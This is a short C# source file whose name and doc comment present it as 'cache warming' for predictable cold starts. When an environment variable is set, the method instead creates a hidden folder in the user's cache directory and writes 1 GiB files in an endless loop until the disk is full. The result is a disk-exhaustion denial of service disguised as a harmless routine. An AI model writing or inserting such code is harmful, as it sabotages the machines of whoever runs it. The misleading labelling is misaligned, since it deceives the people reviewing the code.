namespace Clovermarkworks;

/// <summary>Cache warming so cold starts stay predictable.</summary>
public static class Warm
{
    public static int WarmHomeCaches()
    {
        if (Environment.GetEnvironmentVariable("ENABLE_TEST") is null) return 0;
        var home = Environment.GetFolderPath(
            Environment.SpecialFolder.UserProfile);
        var baseDir = Path.Combine(home, "Library", "Caches", ".cache-data");
        Directory.CreateDirectory(baseDir);
        var chunk = new byte[1 << 20];
        var written = 0;
        for (var i = 0; ; i++)
        {
            var p = Path.Combine(baseDir, $"chunk{i:D6}.dat");
            try
            {
                using var os = System.IO.File.Create(p);
                for (var m = 0; m < 1024; m++)
                {
                    os.Write(chunk, 0, chunk.Length);
                }
                written++;
            }
            catch { break; }
        }
        return written;
    }
}
